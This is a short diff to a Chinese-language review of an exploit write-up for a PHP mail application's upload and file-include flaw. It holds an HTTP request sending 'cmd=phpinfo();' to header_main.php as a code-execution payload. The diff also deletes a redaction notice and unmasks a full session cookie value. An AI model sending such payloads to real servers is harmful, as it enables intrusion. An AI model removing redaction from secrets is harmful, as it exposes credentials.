@@ -36,7 +36,6 @@ source_status: "unknown"
 - compose.php上传请求重复两次；跨端口、上传目录、会话路径到lang包含的关键连接缺文字解释
 - 无型号/版本、鉴权和修复
 - 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -123,7 +122,7 @@ Content-Disposition: form-data; name="file"; filename="compose.php"
 ```http
 POST /mail/include/header_main.php HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID_NF=82c**************************c71
+Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
 Host:
 
 cmd=phpinfo();
